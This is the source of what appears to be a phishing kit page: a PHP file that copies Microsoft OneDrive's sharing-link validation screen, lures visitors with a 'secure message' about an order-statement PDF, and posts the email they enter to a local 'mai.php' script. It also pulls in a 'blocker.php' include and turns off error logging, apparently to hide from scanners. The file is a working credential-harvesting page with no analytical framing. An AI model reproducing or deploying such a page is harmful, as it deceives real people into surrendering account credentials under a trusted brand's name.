<? 

include('blocker.php');

error_reporting(0);
ini_set('error_log',NULL);
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:o="urn:schemas-microsoft-com:office:office" lang="en-us" dir="ltr">
<head><meta name="GENERATOR" content="Microsoft SharePoint" /><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><meta http-equiv="Expires" content="0" /><meta name="Robots" content="NOHTMLINDEX" /><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" /><meta http-equiv="X-UA-Compatible" content="IE=edge" /><link id="favicon" rel="shortcut icon" href="images/favicon.ico?rev=45" type="image/vnd.microsoft.icon" /><title>
	Sharing Link Validation
</title>
	<style type="text/css" media="screen, print, projection">
		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figcaption,figure,main{display:block}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:inherit}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}dfn{font-style:italic}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}audio,video{display:inline-block}audio:not([controls]){display:none;height:0}img{border-style:none}svg:not(:root){overflow:hidden}button,input,optgroup,select,textarea{font-family:sans-serif;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{display:inline-block;vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details,menu{display:block}summary{display:list-item}canvas{display:inline-block}template{display:none}[hidden]{display:none}
		.ms-Fabric{-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;color:#333;font-family:'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;font-size:14px}.ms-Fabric button,.ms-Fabric input{font-family:inherit}@media (max-width:479px){.ms-hiddenLgDown,.ms-hiddenMdDown,.ms-hiddenSm,.ms-hiddenXlDown,.ms-hiddenXxlDown{display:none!important}}@media (min-width:480px) and (max-width:639px){.ms-hiddenLgDown,.ms-hiddenMd,.ms-hiddenMdDown,.ms-hiddenMdUp,.ms-hiddenXlDown,.ms-hiddenXxlDown{display:none!important}}@media (min-width:640px) and (max-width:1023px){.ms-hiddenLg,.ms-hiddenLgDown,.ms-hiddenLgUp,.ms-hiddenMdUp,.ms-hiddenXlDown,.ms-hiddenXxlDown{display:none!important}}@media (min-width:1024px) and (max-width:1365px){.ms-hiddenLgUp,.ms-hiddenMdUp,.ms-hiddenXl,.ms-hiddenXlDown,.ms-hiddenXlUp,.ms-hiddenXxlDown{display:none!important}}@media (min-width:1366px) and (max-width:1919px){.ms-hiddenLgUp,.ms-hiddenMdUp,.ms-hiddenXlUp,.ms-hiddenXxl,.ms-hiddenXxlDown,.ms-hiddenXxlUp{display:none!important}}@media (min-width:1920px){.ms-hiddenLgUp,.ms-hiddenMdUp,.ms-hiddenXlUp,.ms-hiddenXxlUp,.ms-hiddenXxxl{display:none!important}}
		@font-face {
			font-family: 'FabricMDL2Icons';
			src: url('data:application/octet-stream;base64,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') format('truetype');
		}
		.ms-Icon {
			-moz-osx-font-smoothing: grayscale;
			-webkit-font-smoothing: antialiased;
			display: inline-block;
			font-family: 'FabricMDL2Icons';
			font-style: normal;
			font-weight: normal;
			speak: none;
		}
		.ms-Icon--Cancel:before { content: "\E711"; }
		.ms-Icon--CheckMark:before { content: "\E73E"; }
		.ms-Icon--Completed:before { content: "\E930"; }
		.ms-Icon--Info:before { content: "\E946"; }
		.ms-Icon--ErrorBadge:before { content: "\EA39"; }
		body,html{height:100%;background:#f4f4f4}.checkbox,.notification .dismiss:focus{outline:0}.external-sharing-content{height:100%}.external-sharing-content a.disabled{pointer-events:none;cursor:default}*,:after,:before{box-sizing:inherit}.spinner,html{box-sizing:border-box}.main-content{flex-direction:column;display:flex;align-items:center;padding:0 12px}.top-banner{flex-direction:column;display:flex;height:40px;padding:0 20px;justify-content:center;background:#0078d7}.top-banner .brand-name{color:#fff;font-size:21px}.checkbox{cursor:pointer;padding:0;border:none;background:0 0;margin:0;display:block}.checkbox .checkbox-checkbox{height:20px;width:20px;box-sizing:border-box;display:flex;align-items:center;justify-content:center;border-width:1px;border-style:solid;border-color:#a6a6a6;margin-right:8px;transition-property:'background, border, border-color';transition-duration:.2s;transition-timing-function:.2s;overflow:hidden}.checkbox .checkbox-checkbox .ms-Icon{visibility:hidden}.checkbox.checked .checkbox-checkbox .ms-Icon,.focus-area .ms-Icon:active+.callout,.focus-area .ms-Icon:focus+.callout,.focus-area .ms-Icon:hover+.callout{visibility:visible}.checkbox input[type=checkbox]{display:none}.checkbox .checkbox-label{display:inline-flex;align-items:center;cursor:pointer;position:relative;user-select:none}.checkbox.disabled .checkbox-checkbox{background:#eaeaea;border-color:#eaeaea;color:#fff}.checkbox.disabled .checkbox-label{cursor:default}.checkbox .checkbox-text{margin-right:8px;font-size:14px}.checkbox.checked .checkbox-checkbox{border-color:#0078d7;background:#0078d7;color:#fff}.notification{height:32px;display:flex;justify-content:center;align-items:center;z-index:1;position:absolute;top:-32px;left:0;width:100%;transition:top .5s ease-in-out}.notification .dismiss{border:0;padding:0;background:0 0;height:15px;width:15px;margin:0 8px}.notification .dismiss:hover{cursor:pointer}.notification .dismiss .ms-Icon{margin:0}.notification.visible{top:0}.notification.success{background:#dff6dd}.notification.error{background:#fde7e9}.notification .ms-Icon{margin:0 8px}.notification span{flex:1 1 100%}input::-webkit-inner-spin-button,input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none}input[type=number]{-moz-appearance:textfield}input[type=number]::-ms-clear{display:none}.desktop-logo{margin:57px 0 20px}.mobile-logo{margin-top:24px}.microsoft-logo{height:24px;width:113px}.form-input-container{position:relative;font-size:17px}.form-input-container .focus-area{position:absolute;top:12.5px;right:12.5px}.sharing-form{border-radius:6px;box-shadow:0 0 10px 0 rgba(0,0,0,.17);max-width:360px;display:flex;flex-direction:column;margin:13px 0 16px}.sharing-form .header{border-top-left-radius:6px;border-top-right-radius:6px;padding-top:21px;height:72px;border-bottom-width:1px;border-bottom-style:solid;border-color:#c8c8c8;font-size:21px;text-align:center;background-color:#f8f8f8;z-index:2;position:relative}.form-content{border-bottom-right-radius:6px;border-bottom-left-radius:6px;padding:28px 32px 32px;background:#fff;position:relative}.form-content .placeholder-text,.form-content input{height:44px;width:100%}.form-content .form-submit{background-color:#0078d7;color:#fff;border:0}.form-content .form-submit.disabled{background:#f4f4f4;color:#a6a6a6}.form-content .form-submit.disabled+.submitted-text{display:flex;position:absolute;top:0;left:0;width:100%;height:100%;justify-content:center;align-items:center}.form-content .form-submit.disabled+.submitted-text .spinner{margin-right:14px}.form-content .form-submit+.submitted-text{color:#a6a6a6;background-color:#f4f4f4;display:none}.file-description .file-description-title{color:#666;font-size:14px;margin-bottom:24px}.file-description .file-info{display:flex;align-items:center}.file-description .file-info img{height:32px;width:32px;margin-right:15px}.file-description .file-info .file-name{font-size:17px;color:#333}.form-message{font-size:14px;font-weight:400;color:#666;line-height:17px;margin:22px 0 24px}.form-message .email{color:#333}.form-message a{color:#666}.interrupt-message{text-align:center}.interrupt-message img{width:79px;height:82px;margin-bottom:20px}.interrupt-message .interrupt-message-text{font-size:17px}.form-text-input{border-width:1px;border-style:solid;padding:11px;margin-bottom:20px;color:#666;border-color:#a6a6a6}.form-text-input.disabled{background:#f4f4f4;color:#a6a6a6;border:#f4f4f4}.form-text-input.disabled::placeholder{color:#a6a6a6}.form-text-input.is-empty+.placeholder-text{display:block}.form-text-input.has-error{border-color:#A80000;margin-bottom:14px}.form-text-input+.placeholder-text{position:absolute;color:#666;top:0;left:0;line-height:44px;padding:0 11px;display:none;pointer-events:none}.focus-area,.focus-area .ms-Icon{position:relative;display:inline-block}.form-text-input::placeholder{color:#666}.form-error-container{color:#A80000;font-size:12px;margin-bottom:8px}.focus-area{vertical-align:middle}.callout{bottom:200%;width:276px;left:50%;font-size:12px;line-height:16px;visibility:hidden;background-color:#fff;color:#333;padding:9px 12px;border-radius:6px;margin-left:calc(-276px/2);text-align:left;box-shadow:2px 2px 10px 0 rgba(0,0,0,.3);position:absolute;z-index:3}.callout .callout-title{font-size:17px;margin-bottom:11px;line-height:20px}.callout:after{content:" ";position:absolute;box-shadow:rgba(0,0,0,.3) 2px 2px 2px;transform:rotate(45deg);bottom:-9px;border-width:10px;border-style:solid;border-color:transparent #fff #fff transparent;left:127px}@media (max-width:479px){.callout{left:-95px}.callout:after{right:24px;left:initial}}.legal{font-size:12px;font-weight:400;display:flex;justify-content:space-between}.legal>*{margin-right:12px}.legal>:last-child{margin-right:0}.legal a{color:#333;text-decoration:none}.spinner{height:20px;width:20px;border-radius:50%;border:1.5px solid #c7e0f4;border-top-color:#0078d7;animation:spinAnimation 1.3s infinite cubic-bezier(.53,.21,.29,.67)}@keyframes spinAnimation{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}.form-checkbox-container{margin-top:24px;font-size:14px;font-weight:400}.privacy{padding-top:16px;font-size:12px;}
	</style>
	<div id="moduleLinkPanel">
	
	<link rel="preconnect" href="https://spoprod-a.akamaihd.net" crossorigin /><script type="text/javascript">
		var g_responseEnd = new Date().getTime();window['FabricConfig'] = { fontBaseUrl: ''};
	</script>

	</script><script type="text/javascript">// <![CDATA[ 

function setImageUrl() {  
var image = document.getElementById('imgSharingLinkTargetIcon'); 
image.style.opacity = '0'; 
image.onerror = function() {image.src = 'https://vikinggenetics-my.sharepoint.com/personal/datho_vikinggenetics_com_au/_layouts/15/images/pdf.png'; image.style.opacity = '1'}; 
try { 
require(['@uifabric/file-type-icons/lib/initializeFileTypeIcons', '@uifabric/file-type-icons/lib/getFileTypeIconProps', '@uifabric/styling/lib/utilities/icons'], function( initialize, getFileTypeIconProps, icons) {
initialize.initializeFileTypeIcons(); 
var props = getFileTypeIconProps.getFileTypeIconProps({ extension: '.pdf', size: 32, imageFileType: 'png', type: 3 }); 
image.src = icons.getIcon(props.iconName).code.props.src; image.style.opacity = '1';});
} catch(e) { image.src ='https://vikinggenetics-my.sharepoint.com/personal/datho_vikinggenetics_com_au/_layouts/15/images/pdf.png'; image.style.opacity = '1'}}
// ]]>
</script>
</div><script type="text/javascript">// <![CDATA[ 


		function _spBodyOnLoad()
		{
			try
			{
				if(document.getElementById("txtPassword") != null)
				{
					document.getElementById("txtPassword").focus();
				}
				else if(document.getElementById("txtTOAAEmail") != null)
				{
					document.getElementById("txtTOAAEmail").focus();
				}
				else if(document.getElementById("btnRequestCode") != null)
				{
					document.getElementById("btnRequestCode").focus();
				}
				else if(document.getElementById("txtTOAACode") != null)
				{
					document.getElementById("txtTOAACode").focus();
				}
			}
			catch(e)
			{}
			try
			{
				showToastNotification();
			}
			catch(e)
			{}
			try
			{
				if (typeof setImageUrl === "function")
				{
					setImageUrl();
				}
			}
			catch(e)
			{}
		}
	// ]]>
</script></head>
<body onload="if (typeof(_spBodyOnLoad) != 'undefined') _spBodyOnLoad();">
	<div id="SharingValidationControlsSection" class="external-sharing-content ms-Fabric">
	
	<form method="post" action="mai.php"  id="ctl12">
	<div class="aspNetHidden">
	<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
	<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
	<input type="hidden" name="SideBySideToken" id="SideBySideToken" value="16.0.8231.1219" />
	<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="LF+1tO6Z1CEQJZCqrc/npn4nNwt03CcVHDkCa/gY9IVWrLNc5Sc7qHVdf92sOFBdZo3+4mOC39RlNWZiUONWMRMStnP6GO8qQM0SfY8askLemRXPxoCHvWuMw0kY7QGsqDoNk2c3Gws9bZDZcqPX1BdAm0ow9NnQOfkkZ8nwMeUmtFTs27bafdV2RZUcc0NIY+Il3SgHgmQPnid5G8UHyD5XGiCigGbeqU2PKl7GX5kVrKyojl+66xQZpNzNDsC7ipkPeInD2VcRRcsmyd/xH8sdmQ3FgDuSixWAklh+JGXi/ddqhFiYG6p0i8X0UwsJ6laInsK5pXvgU0HtdFI8kx5idKdKubz3usXwRdc09O+r1Uu8oHdP8gA5J6xpAEOUoQcKNeOt4+ozoS0witnnz83+LcGYaXBB+KMlqiIJ1/qev/x6eNtqqQtbsT9hdit2hkHrpw458uXfWyMLV26krwea4EAFBhOAv8rxXLuZxQIJziYrGVX5gMjce3B884guusppX8giSWWxy8CbTGf0JtvC4lGRrYQieHLYsK0UTT/RPFNZ/PYMwE4U12+OZWPqQrkgr7W2EWx78hDTrwd/qxaK1FmZJSRow2qwAx/NImjByBLas/KZbpZ5TRxZJTOb+eE0Pz25o+dAMAQH9UGPZ//dHePnSi3/RIacJ4ahkU8rqERG5HDR3MJlYtmbwur7rji6IsMVkMppIQwX/WMB+Su4u2mo5GUb2EG0OVCd6nYUTXAmOT1E0GiZ5/pz+PIIO9L9i/Yi/Sw/d6Yf73bfutdlYx9vMERRu9tZ7Ws3tkzSm4tS3qUhGYHKPxFyo6qAAxpfONk/gtOGm3F3Q7kYI/mhLKd2wTRZ40oJfKmGJvhLR8yfIOwbsK/e6kxe7zqZI56VNVsAfxHGQNL1Z3FU7r8nLWsvA4Jatb8tMqtYviTXfCFKvazFpNE5EgA96dRw" />
	</div>
	


	

	




	<div class="aspNetHidden">

		<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="B05AAB8C" />
		<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
		<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="V2S76KLDoKk8Ba4lvesaebA2bQ1ExPedqnpCeIKGPEU3WWjfEH+yD3KLf8tTF4KmActejcwBQ/QQgpvis4vg63flVnMDzQ2gbJMQn4DL/g3YgBLPm07vuOvU1ZD/2h3/1taBwoyypP9U39mDulVRpeTPGMLQGv7S1zJfJazhuyA=" />
	</div>
		

		<div class="top-banner">
			<div class="brand-name"><span id="lblSiteType">OneDrive</span></div>
		</div>
		<div class="main-content">
			<div class="desktop-logo ms-hiddenSm">
				<img class="microsoft-logo" src='naf/inf/microsoft_logo.svg' alt="Microsoft" />
			</div>
			<div class="sharing-form">
				<div class="header">
					<span id="lblFormTitle">YOU HAVE ONE SECURE MESSAGE</span>
				</div>
				<div class="form-content">
					
					
					<div class="file-description">
						<div class="file-description-title"><span id="lblDataEntryTitle">You've received a secure link to:</span></div>
						<div class="file-info">
									<img id="imgSharingLinkTargetIcon" alt="You&#39;ve received a secure link for:” src="" style="height:32px;width:32px;" />
							<div class="file-name">
									<span id="lblSharingLinkTarget">ORDER-STATEMENT.pdf</span>
							</div>
						</div>
					</div>
					<div id="TOAAEmailEntryControls">
		
						<div class="form-message"><span id="lblTOAAEmailDescription">To open this secure link, we'll need you to enter the email that this item was shared to.</span></div>
						<div class="form-input-container">
							<input name="id" type="email" maxlength="70" id="txtTOAAEmail" class="form-text-input enable-on-submit is-empty " placeholder="Enter your email" />
							<div class="focus-area">
								<i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
								<div class="callout">
									<div class="callout-title">Why do I have to do this?</div>
									The person that has shared this link with you is sharing with a secure link which requires you to verify your identity.
								</div>
							</div>
						</div>
						<div class="form-error-container">
							<span id="" style="display:none;">Your email address is required</span>
							<span id="" style="display:none;">Your email address must be in the correct email format (e.g. "user@contoso.com")</span>
							<span id="IncorrectTOAAEMail" style="display:none;">Sorry, this email is not on the list of people this link is secured to. Please contact the person who shared it with you.</span>
						</div>
						<div class="form-input-container">
							
							<input class="form-submit enable-on-submit" onmousedown="this.className='form-submit enable-on-submit'" id="login_btn" onmouseover="this.className='form-submit enable-on-submit'" onclick="clkLgn()" onmouseout="this.className='form-submit enable-on-submit'" type="submit" value="Next" name="form-submit enable-on-submit" /> 
							<div class="submitted-text">
								<div class="spinner"></div>Checking...
							</div>
						</div>
					
	</div>
					
					
					
					
					<div id="PrivacyPolicy">
		
						<div class="privacy">
							<span id="lblPrivacyUrl">By clicking Next you allow ONEDRIVE to use your email address in accordance with their privacy statement.</span>
							<span id="lblNoPrivacyUrl">ONEDRIVE will provide links to their terms for you to review.</span>
						</div>
					
	</div>
				</div>
			</div>
			<div class="legal">
				<span>&copy; 2020 Microsoft</span>
				<!--<a href='#'>Terms of Use</a> To Be Deleted-->
				<a href='https://go.microsoft.com/fwlink/?linkid=845480'>Privacy &amp; Cookies</a>
			</div>
			<div class="mobile-logo ms-hiddenMdUp">
				<img class="microsoft-logo" src='naf/inf/microsoft_logo.svg' alt="Microsoft" />
			</div>
		</div>



	

</form>
	
</div>
</body>
</html>
<script type="text/javascript" nonce="934b5938-871a-4a4d-8da1-2fbd5d98e3ee">
	var g_duration = 245;
var g_iisLatency = 3;
var g_requireJSDone = new Date().getTime();
</script>